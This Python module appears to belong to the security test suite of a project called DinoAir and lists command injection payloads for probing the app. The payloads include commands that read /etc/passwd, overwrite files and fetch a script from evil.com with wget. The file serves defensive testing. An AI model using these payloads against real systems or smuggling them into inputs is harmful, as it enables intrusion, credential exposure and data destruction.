"""
Command injection attack testing module.

Tests for command execution vulnerabilities in DinoAir.
"""

from typing import List, Tuple
from tests.security.core.base_tester import BaseSecurityTester


class CommandInjectionTester(BaseSecurityTester):
    """Tests for command injection vulnerabilities."""
    
    def get_test_name(self) -> str:
        """Get the name of this test category."""
        return "Command Injection"
    
    def get_payloads(self) -> List[Tuple[str, str]]:
        """Get command injection test payloads."""
        return [
            # Basic injection
            ("; ls -la", "Semicolon command separator"),
            ("| whoami", "Pipe command"),
            ("& net user", "Ampersand command"),
            ("&& id", "Double ampersand"),
            ("|| cat /etc/passwd", "Double pipe"),
            
            # Backticks and substitution
            ("`cat /etc/passwd`", "Backtick substitution"),
            ("$(whoami)", "Dollar substitution"),
            ("${USER}", "Variable expansion"),
            
            # Newline injection
            ("\ncat /etc/passwd", "Newline injection"),
            ("\r\ndir c:\\", "CRLF injection"),
            
            # Encoded variations
            ("%3B%20ls%20-la", "URL encoded semicolon"),
            ("%7C%20whoami", "URL encoded pipe"),
            
            # Process substitution
            ("<(cat /etc/passwd)", "Process input substitution"),
            (">(malicious.sh)", "Process output substitution"),
            
            # Null byte injection
            ("test\x00; cat /etc/passwd", "Null byte separator"),
            
            # Unicode variations
            ("；ls", "Full-width semicolon"),
            ("｜whoami", "Full-width pipe"),
            
            # Combined with paths
            ("../../../bin/sh -c 'id'", "Path with command"),
            
            # Environment variable injection
            ("$PATH", "PATH variable"),
            ("${IFS}cat${IFS}/etc/passwd", "IFS abuse"),
            
            # Time-based
            ("; sleep 10", "Sleep command"),
            ("& ping -n 10 127.0.0.1", "Windows ping delay"),
            
            # Shell metacharacters
            ("*", "Wildcard expansion"),
            ("?", "Single char wildcard"),
            ("[a-z]", "Character class"),
            ("!", "History expansion"),
            ("~", "Home directory expansion"),
            
            # Command chaining
            ("; cd /tmp && wget evil.com/shell.sh", "Command chain"),
            ("| tee /tmp/output.txt", "Output redirection"),
            ("> /etc/passwd", "File overwrite"),
            (">> /tmp/log", "File append"),
        ]